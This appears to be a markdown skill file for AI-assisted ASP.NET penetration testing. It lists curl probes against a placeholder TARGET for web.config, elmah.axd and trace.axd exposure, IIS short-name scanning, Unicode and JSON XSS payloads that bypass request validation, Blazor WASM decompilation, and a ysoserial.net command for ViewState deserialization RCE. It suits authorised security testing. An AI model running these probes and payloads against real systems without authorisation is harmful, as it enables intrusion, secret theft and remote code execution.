---
name: aspnet
description: ASP.NET security testing covering ViewState deserialization, Blazor WASM reverse engineering, request validation bypass, and web.config exposure
---

# ASP.NET Security Testing

## Key Vulnerabilities

### ViewState Deserialization

```bash
# If ViewState MAC validation is disabled → RCE via deserialization
# Check for __VIEWSTATE in HTML forms
curl -sk "https://TARGET/" | grep -oP '__VIEWSTATE.*?value="[^"]*"' | head -3

# If machine key is known (from web.config leak):
# Use ysoserial.net to generate malicious ViewState payload
# ysoserial.exe -p ViewState -g ActivitySurrogateSelector --machinekey KNOWN_KEY
```

### Web.config Exposure

```bash
curl -sk "https://TARGET/web.config" | head -30
curl -sk "https://TARGET/Web.config"
# Contains: connection strings, machine keys, API keys, auth settings

# IIS short-name scanning
curl -sk "https://TARGET/W~1.CON" -D - # May reveal web.config via 8.3 names
```

### Request Validation Bypass

```bash
# ASP.NET blocks <script> in inputs by default — bypass techniques:
curl -sk "https://TARGET/page?input=%uff1cscript%uff1ealert(1)%uff1c/script%uff1e" # Unicode
curl -sk "https://TARGET/page" -X POST -H "Content-Type: application/json" \
  -d '{"input":"<script>alert(1)</script>"}' # JSON bypasses request validation
```

### Blazor WASM

```bash
# Download and decompile Blazor WASM assemblies
curl -sk "https://TARGET/_framework/blazor.boot.json" | python3 -m json.tool
# Download DLLs listed in boot.json → decompile with ILSpy/dnSpy
# Look for hardcoded secrets, API endpoints, auth logic
```

### Elmah Error Logging

```bash
curl -sk "https://TARGET/elmah.axd" | head -20
# Elmah logs all exceptions with full stack traces, request details
```

### Trace.axd

```bash
curl -sk "https://TARGET/trace.axd" | head -30
# Application trace with request headers, session data, and timing
```

## Pro Tips

1. `web.config` exposure is the #1 ASP.NET vulnerability — reveals machine keys for ViewState RCE
2. ViewState deserialization with known machine key = guaranteed RCE (use ysoserial.net)
3. Blazor WASM DLLs can be downloaded and decompiled — all client-side logic is exposed
4. `elmah.axd` and `trace.axd` are common info disclosure endpoints — always check
5. IIS 8.3 short-name vulnerability can enumerate files even when directory listing is off
6. JSON Content-Type bypasses ASP.NET request validation — test XSS payloads via JSON body
